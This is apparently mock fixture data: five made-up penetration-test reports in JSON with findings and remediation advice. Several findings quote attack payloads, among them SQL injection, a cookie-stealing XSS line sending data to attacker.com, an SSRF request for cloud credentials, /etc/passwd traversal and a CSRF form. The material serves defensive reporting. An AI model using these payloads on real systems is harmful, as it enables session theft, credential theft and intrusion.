@@ -1,0 +1,212 @@
+[
+  {
+    "id": "report-001",
+    "scopes": [
+      { "id": "scope-acme-1", "domain": "app.acmecorp.com" }
+    ],
+    "summary": {
+      "globalSecurityScore": 28,
+      "vulnerabilityCount": { "critical": 1, "high": 1, "medium": 1, "low": 0, "info": 0 },
+      "scanDate": "2026-02-14T09:00:00Z"
+    },
+    "vulnerabilities": [
+      {
+        "id": "vuln-001-1",
+        "title": "SQL Injection",
+        "severity": "Critical",
+        "scopeId": "scope-acme-1",
+        "description": "## SQL Injection in `/api/login`\n\nThe `username` parameter in the login endpoint is directly interpolated into a SQL query without sanitization.\n\n**Proof of Concept:**\n```bash\nPOST /api/login\n{ \"username\": \"admin' OR '1'='1' --\", \"password\": \"x\" }\n```\n\nThis returns a valid session token for the `admin` account.",
+        "recommendation": "## Remediation\n\n### Immediate Actions\n- **Rotate** any database credentials that may have been exposed.\n- Review logs for signs of prior exploitation.\n\n### Code Fix\nReplace string concatenation with **parameterized queries**:\n```js\n// SAFE\nconst query = 'SELECT * FROM users WHERE username = $1';\nawait db.query(query, [username]);\n```\n\n### Defense in Depth\n- Use an ORM (Prisma, TypeORM) that uses prepared statements natively.\n- Apply a **WAF** as a secondary control.\n\n> **Priority:** Fix immediately before next deployment."
+      },
+      {
+        "id": "vuln-001-2",
+        "title": "Reflected XSS",
+        "severity": "High",
+        "scopeId": "scope-acme-1",
+        "description": "## Reflected XSS in Search Endpoint\n\nThe `q` query parameter value is reflected in the page response without HTML encoding.\n\n**Payload:**\n```bash\nGET /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n```\n\nAny user clicking a crafted link will have their session cookies exfiltrated.",
+        "recommendation": "## Remediation\n\n### Output Encoding\nEncode all user-supplied values before inserting them into HTML using a context-aware escaping library (e.g., DOMPurify for client-side or `he` for server-side).\n\n### HTTP Headers\nAdd a strict `Content-Security-Policy` header to prevent inline script execution:\n```bash\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\n### Session Security\nUse the `HttpOnly` flag on all session cookies to prevent JavaScript access."
+      },
+      {
+        "id": "vuln-001-3",
+        "title": "CORS Misconfiguration",
+        "severity": "Medium",
+        "scopeId": "scope-acme-1",
+        "description": "## Overly Permissive CORS Policy\n\nThe API reflects the `Origin` header back in `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`, allowing any domain to make credentialed cross-origin requests.\n\n**Observed header:**\n```bash\nAccess-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true\n```",
+        "recommendation": "## Remediation\n\n### Configuration Fix\nMaintain an explicit **allowlist** of trusted origins on the server and check incoming requests against it.\n\n### Restriction\nNever combine a wildcard or indiscriminately reflected origin with `Access-Control-Allow-Credentials: true`.\n\n### Hardening\nReject preflight requests from untrusted origins entirely at the server/WAF level."
+      }
+    ]
+  },
+  {
+    "id": "report-002",
+    "scopes": [
+      { "id": "scope-acme-1", "domain": "app.acmecorp.com" }
+    ],
+    "summary": {
+      "globalSecurityScore": 54,
+      "vulnerabilityCount": { "critical": 0, "high": 1, "medium": 1, "low": 1, "info": 1 },
+      "scanDate": "2026-03-10T10:30:00Z"
+    },
+    "vulnerabilities": [
+      {
+        "id": "vuln-002-1",
+        "title": "Broken Authentication",
+        "severity": "High",
+        "scopeId": "scope-acme-1",
+        "description": "## Absent Account Lockout Policy\n\nThe `/api/login` endpoint does not enforce rate limiting or lockout after repeated failed attempts, enabling brute-force attacks.\n\n**Test performed:**\n```bash\nfor i in $(seq 1 500); do\n  curl -s -X POST https://app.acmecorp.com/api/login \\\n    -d '{\"username\":\"admin\",\"password\":\"guess'$i'\"}'\ndone\n```\n\nNo lockout or CAPTCHA was triggered after 500 attempts.",
+        "recommendation": "## Remediation\n\n### Lockout Policy\nEnforce an account **lockout** after 5 consecutive failed attempts (with exponential backoff).\n\n### Rate Limiting\nImplement **rate limiting** per IP and per account using a token bucket or sliding window algorithm.\n\n### CAPTCHA Integration\nAdd a CAPTCHA challenge after 3 failed attempts to definitively deter automated tooling."
+      },
+      {
+        "id": "vuln-002-2",
+        "title": "Insecure TLS Configuration",
+        "severity": "Medium",
+        "scopeId": "scope-acme-1",
+        "description": "## TLS 1.0 and TLS 1.1 Accepted\n\nThe server still accepts connections over deprecated TLS versions, exposing users to BEAST and POODLE downgrade attacks.\n\n**Verified with:**\n```bash\nnmap --script ssl-enum-ciphers -p 443 app.acmecorp.com\n```\n\nOutput confirmed `TLSv1.0` and `TLSv1.1` are enabled.",
+        "recommendation": "## Remediation\n\n### Server Configuration\nDisable TLS 1.0 and TLS 1.1 in your web server configuration entirely.\n\n### Requirement\nEnforce **TLS 1.2 minimum**, and prefer TLS 1.3 where supported by clients.\n\n### Nginx Example\n```bash\nssl_protocols TLSv1.2 TLSv1.3;\n```"
+      },
+      {
+        "id": "vuln-002-3",
+        "title": "Verbose Error Messages",
+        "severity": "Low",
+        "scopeId": "scope-acme-1",
+        "description": "## Stack Traces Exposed in Production\n\nUnhandled exceptions return full server-side stack traces including file paths and framework version to the client.\n\n**Example response body:**\n```json\n{\n  \"error\": \"TypeError: Cannot read properties of undefined\",\n  \"stack\": \"at /app/src/controllers/user.js:42:15\"\n}\n```",
+        "recommendation": "## Remediation\n\n### Global Error Handling\nConfigure a **global error handler** that catches exceptions and returns a generic, non-informative message in production.\n\n### Safe Logging\nLog the full stack trace server-side only (using a library like Winston or Pino) and never send it to the client.\n\n### Environment Variables\nSet `NODE_ENV=production` safely to suppress framework debug output automatically."
+      },
+      {
+        "id": "vuln-002-4",
+        "title": "Directory Listing Enabled",
+        "severity": "Info",
+        "scopeId": "scope-acme-1",
+        "description": "## Static File Directory Listing\n\nThe `/static/` path returns a browsable directory index, disclosing internal file names and structure.\n\nNo sensitive files were found in the listing, but it aids reconnaissance.",
+        "recommendation": "## Remediation\n\n### Configuration\nDisable directory listing in your web server:\n\n```bash\n# Nginx\nautoindex off;\n```\n\n### Application Routing\nServe static files only through explicit application routes, preventing arbitrary folder traversal."
+      }
+    ]
+  },
+  {
+    "id": "report-003",
+    "scopes": [
+      { "id": "scope-techvault-1", "domain": "api.techvault.io" }
+    ],
+    "summary": {
+      "globalSecurityScore": 22,
+      "vulnerabilityCount": { "critical": 1, "high": 2, "medium": 0, "low": 0, "info": 0 },
+      "scanDate": "2026-01-20T14:00:00Z"
+    },
+    "vulnerabilities": [
+      {
+        "id": "vuln-003-1",
+        "title": "Server-Side Request Forgery (SSRF)",
+        "severity": "Critical",
+        "scopeId": "scope-techvault-1",
+        "description": "## SSRF via Webhook URL Parameter\n\nThe `/api/webhooks/register` endpoint accepts a user-supplied URL and makes a server-side HTTP request to it without validation, allowing attackers to probe the internal network.\n\n**Payload used to reach AWS metadata service:**\n```bash\nPOST /api/webhooks/register\n{ \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n```\n\nThe response included live AWS IAM credentials.",
+        "recommendation": "## Remediation\n\n### Strict Validation\nValidate and heavily **allowlist** permitted URL schemes and target domains.\n\n### Network Filtering\nExplicitly block requests to private internal IP ranges (`10.x`, `172.16.x`, `192.168.x`, `169.254.x`).\n\n### Egress Proxy\nUse a dedicated egress proxy with a clear whitelist for all outbound webhook HTTP calls.\n\n### Immediate Action\nRotate the exposed IAM credentials immediately."
+      },
+      {
+        "id": "vuln-003-2",
+        "title": "JWT Vulnerability",
+        "severity": "High",
+        "scopeId": "scope-techvault-1",
+        "description": "## JWT `alg: none` Accepted\n\nThe API accepts JWT tokens with the algorithm set to `none`, bypassing signature verification entirely.\n\n**Crafted token header:**\n```json\n{ \"alg\": \"none\", \"typ\": \"JWT\" }\n```\n\nAn attacker can forge any user identity by crafting a token with no signature.",
+        "recommendation": "## Remediation\n\n### Algorithm Pinning\n**Explicitly** configure the JWT library to only accept expected symmetric or asymmetric algorithms (e.g. `RS256`, `HS256`).\n\n### Rejection\nNever allow the chosen algorithm to be dynamically driven by the token payload header.\n\n### Code Example\n```js\njwt.verify(token, secret, { algorithms: ['HS256'] });\n```"
+      },
+      {
+        "id": "vuln-003-3",
+        "title": "Path Traversal",
+        "severity": "High",
+        "scopeId": "scope-techvault-1",
+        "description": "## Path Traversal in File Download Endpoint\n\nThe `/api/files/download?name=` parameter is used directly to construct a file path without sanitization.\n\n**Exploit:**\n```bash\nGET /api/files/download?name=../../etc/passwd\n```\n\nThe server returned the contents of `/etc/passwd`.",
+        "recommendation": "## Remediation\n\n### Path Resolution\nResolve the canonical path and continuously verify it starts exactly with the expected **base directory directory**:\n```js\nconst safe = path.resolve(BASE_DIR, fileName);\nif (!safe.startsWith(BASE_DIR)) throw new Error('Forbidden');\n```\n\n### Best Practices\nNever blindly concatenate user input into file paths directly. Use specific IDs or hashes and resolve them to paths via a database link."
+      }
+    ]
+  },
+  {
+    "id": "report-004",
+    "scopes": [
+      { "id": "scope-globalfin-1", "domain": "erp.globalfin.net", "ipAddress": "10.20.30.40" }
+    ],
+    "summary": {
+      "globalSecurityScore": 12,
+      "vulnerabilityCount": { "critical": 2, "high": 1, "medium": 0, "low": 1, "info": 0 },
+      "scanDate": "2026-02-28T08:00:00Z"
+    },
+    "vulnerabilities": [
+      {
+        "id": "vuln-004-1",
+        "title": "Hardcoded Credentials",
+        "severity": "Critical",
+        "scopeId": "scope-globalfin-1",
+        "description": "## Hardcoded Database Password in Source Code\n\nThe production database password was found hardcoded in the application repository, publicly accessible via a misconfigured GitLab instance.\n\n**File:** `src/config/database.js`\n```js\nconst DB_PASSWORD = 'Gl0balF!nProd2024';\n```\n\nThe credentials are valid and allow full read/write access to the production PostgreSQL database.",
+        "recommendation": "## Remediation\n\n### Immediate Rotation\n**Rotate** the compromised credentials immediately in the production environment.\n\n### Secrets Management\nStore secrets exclusively in environment variables or a robust secrets manager (e.g. HashiCorp Vault, AWS Secrets Manager).\n\n### Git Auditing\nAudit the full git history for other leaked secrets utilizing tools like `trufflehog` or `gitleaks`, and scrub the history.\n\n### Repository Security\nEnsure the GitLab instance is correctly configured to strictly require authentication."
+      },
+      {
+        "id": "vuln-004-2",
+        "title": "Default Credentials",
+        "severity": "Critical",
+        "scopeId": "scope-globalfin-1",
+        "description": "## Default Admin Credentials on ERP Panel\n\nThe ERP administration panel (`/admin`) is accessible with the vendor default credentials `admin / admin123`, which were never changed during deployment.",
+        "recommendation": "## Remediation\n\n### Password Reset\nChange all vendor default credentials immediately upon system instantiation.\n\n### Password Policy\nEnforce a **strong password policy** globally on all administrator and standard system accounts.\n\n### Access Control\nRestrict `/admin` page access strictly to expected internal IP ranges employing standard firewall rules."
+      },
+      {
+        "id": "vuln-004-3",
+        "title": "Privilege Escalation",
+        "severity": "High",
+        "scopeId": "scope-globalfin-1",
+        "description": "## Horizontal Privilege Escalation via IDOR\n\nAuthenticated users can access other users' financial records by changing the `userId` parameter in the request.\n\n**Example:**\n```bash\nGET /api/reports?userId=1337\n```\n\nReturns full financial data for user `1337` regardless of the authenticated user's identity.",
+        "recommendation": "## Remediation\n\n### Identity Source\nAlways derive the target user context systematically from the **authenticated session** data (like JWT attributes), never rely purely on request parameters.\n\n### Access Checks\nImplement robust server-side authorization checks on every sensitive data access endpoint to verify ownership.\n\n### Unit Testing\nIntegrate automated integration tests that emphatically verify standard users cannot interact with other users' resources."
+      },
+      {
+        "id": "vuln-004-4",
+        "title": "Insufficient Logging and Monitoring",
+        "severity": "Low",
+        "scopeId": "scope-globalfin-1",
+        "description": "## No Audit Trail for Sensitive Actions\n\nAdmin-level actions (user creation, role changes, data exports) are not logged, making it impossible to detect or reconstruct a compromise.",
+        "recommendation": "## Remediation\n\n### Audit Logging\nImplement structured audit logging natively for all sensitive actions, comprehensively recording actor, timestamp, relevant action, and target id.\n\n### Centralised Aggregation\nContinuously forward application logs securely to a centralised SIEM instance (e.g., Splunk, ELK stack).\n\n### Active Alerting\nSet up real-time observability alerts for highly suspicious patterns such as voluminous bulk data exports or role modifications executed outside typical business hours."
+      }
+    ]
+  },
+  {
+    "id": "report-005",
+    "scopes": [
+      { "id": "scope-healthsync-1", "domain": "portal.healthsync.com" },
+      { "id": "scope-healthsync-2", "ipAddress": "192.168.5.10" }
+    ],
+    "summary": {
+      "globalSecurityScore": 45,
+      "vulnerabilityCount": { "critical": 1, "high": 0, "medium": 1, "low": 2, "info": 0 },
+      "scanDate": "2026-03-05T11:00:00Z"
+    },
+    "vulnerabilities": [
+      {
+        "id": "vuln-005-1",
+        "title": "Sensitive Data Exposure",
+        "severity": "Critical",
+        "scopeId": "scope-healthsync-1",
+        "description": "## Patient PII Returned in API Without Authorization\n\nThe `/api/patients` endpoint returns full patient records (name, date of birth, diagnosis, SSN) in paginated responses accessible to **any authenticated user**, regardless of role.\n\nA standard nurse-role account was used to dump 14,000 patient records in under 10 minutes.",
+        "recommendation": "## Remediation\n\n### Access Control (RBAC)\nApply strict **role-based access control (RBAC)** — ensure that only fully authorized practitioners or administrative roles can access bulk patient data.\n\n### Field Filtering\nImplement field-level data filtering structurally so PII (e.g., SSN, core diagnoses) is explicitly stripped out from payloads unless the specific access role is validated.\n\n### Rate Limiting & Pagination Data Safeguards\nEnforce hard pagination bounds and firm rate limits specifically modeled to prevent sudden bulk information extraction.\n\n### Compliance Check\nAs this constitutes a potential **HIPAA breach**, immediately consult data privacy officers and internal compliance teams."
+      },
+      {
+        "id": "vuln-005-2",
+        "title": "Cross-Site Request Forgery (CSRF)",
+        "severity": "Medium",
+        "scopeId": "scope-healthsync-1",
+        "description": "## Missing CSRF Protection on State-Changing Endpoints\n\nPOST endpoints that modify patient data do not validate a CSRF token, allowing a malicious page to trigger requests on behalf of a logged-in user.\n\n**PoC form:**\n```html\n<form action=\"https://portal.healthsync.com/api/patients/99/update\" method=\"POST\">\n  <input name=\"diagnosis\" value=\"attacker-controlled\" />\n</form>\n<script>document.forms[0].submit();</script>\n```",
+        "recommendation": "## Remediation\n\n### Token Pattern\nImplement the **Synchronizer Token Pattern** — inject a unique CSRF token into every rendering form and mathematically validate it back on the server-side processing end.\n\n### SameSite Cookies\nActivate the `SameSite=Strict` or `SameSite=Lax` session cookie attributes consistently across environments as an indispensable complementary defense.\n\n### Header Verifications\nEnsure to strictly verify the `Origin` and `Referer` HTTP headers exclusively on all state-changing `POST`, `PUT`, or `DELETE` requests."
+      },
+      {
+        "id": "vuln-005-3",
+        "title": "Open Redirect",
+        "severity": "Low",
+        "scopeId": "scope-healthsync-1",
+        "description": "## Unvalidated Redirect After Login\n\nThe `?next=` parameter on the login page is not validated, allowing redirection to arbitrary external URLs after authentication — facilitating phishing.\n\n**Example:**\n```bash\nhttps://portal.healthsync.com/login?next=https://attacker.com/fake-portal\n```",
+        "recommendation": "## Remediation\n\n### Validate Redirect Paths\nSystematically dictate that `next` values are entirely interpreted solely as **relative paths** inherently operating on the exact same root origin.\n\n### Origin Allowlisting\nAlternately, strictly validate the next location exclusively against a predefined secure allowlist of logically permitted, thoroughly trusted redirect destinations.\n\n### Reject Non-relative Links\nFailing softly, proactively reject or forcefully ignore any specific `next` URL string values exhibiting an overt scheme prefix (`http://`, `https://`) or a dual absolute `/` segment (`//`)."
+      },
+      {
+        "id": "vuln-005-4",
+        "title": "Clickjacking",
+        "severity": "Low",
+        "scopeId": "scope-healthsync-2",
+        "description": "## Missing X-Frame-Options Header on Internal Portal\n\nThe internal IP (`192.168.5.10`) serves an admin dashboard that can be embedded in an `<iframe>` on a malicious page, enabling clickjacking attacks against internal users.\n\n**Verified:**\n```html\n<iframe src=\"http://192.168.5.10/admin\"></iframe>\n```\nLoads without restriction.",
+        "recommendation": "## Remediation\n\n### Header Implementation\nDirectly inject the specific following HTTP security response header to strictly block basic framing inherently:\n```bash\nX-Frame-Options: DENY\n```\n\n### Content-Security-Policy Alternative\nOr instead perfectly deploy the inherently more versatile CSP mechanism framing directive:\n```bash\nContent-Security-Policy: frame-ancestors 'none';\n```"
+      }
+    ]
+  }
+]
